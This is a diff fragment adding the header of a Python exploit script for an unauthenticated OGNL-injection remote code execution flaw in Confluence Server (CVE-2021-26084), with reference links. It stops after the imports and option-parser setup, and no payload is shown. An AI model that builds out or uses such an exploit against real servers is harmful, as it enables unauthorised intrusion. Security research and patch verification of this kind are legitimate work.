@@ -1,6 +1,20 @@
+# Exploit Title: Confluence Server 7.12.4 - 'OGNL injection' Remote Code Execution (RCE) (Unauthenticated)
+# Date: 01/09/2021
+# Exploit Author: h3v0x
+# Vendor Homepage: https://www.atlassian.com/
+# Software Link: https://www.atlassian.com/software/confluence/download-archives
+# Version: All < 7.12.x versions before 7.12.5
+# Tested on: Linux Distros 
+# CVE : CVE-2021-26084
 
+#!/usr/bin/python3
+
+# References: 
+# https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
+# https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
 
 import requests
+from bs4 import BeautifulSoup
 import optparse
 
 parser = optparse.OptionParser()
